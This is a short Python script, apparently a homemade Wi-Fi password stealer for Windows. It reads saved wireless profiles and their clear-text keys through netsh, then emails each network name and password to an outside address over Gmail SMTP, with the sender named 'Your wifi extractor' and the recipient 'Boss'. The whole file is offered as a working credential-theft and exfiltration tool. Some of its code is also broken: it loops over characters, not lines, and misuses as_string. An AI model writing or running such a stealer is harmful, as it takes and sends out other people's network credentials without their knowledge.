

# smtp config
import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

# config for getting secrets from env
import os
from dotenv import load_dotenv

load_dotenv()
# config ends


server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()

server.ehlo()


server.login(os.getenv("Email"), os.getenv("Password"))

msg = MIMEMultipart()
msg["From"] = "Your wifi extractor"
msg["To"] = "Boss"
msg["Subject"] = "Wifi Passwords"


# getting device info
import os
msg.as_string(os.getlogin())


# now to the wifi extracting stuff
import subprocess

data= subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8')

wifis=[line.split(':')[1][1:-1]for line in data if"All User Profile" in line]

for wifi in wifis:
    results= subprocess.check_output(['netsh','wlan','show','profile',wifi,'key=clear']).decode('utf-8').split('\n')
    results= [line.split(':')[1][1:-1] for line in results if"Key Content" in line]
    try:
        message=f'Name:{wifi}, Password={results[0]}'
        server.sendmail(os.getenv("Email"), os.getenv("SendEmail"), message)
    except IndexError:
        message= f'Name:{wifi}, Password= Cannot be read'
        server.sendmail(os.getenv("Email"), os.getenv("SendEmail"), message)






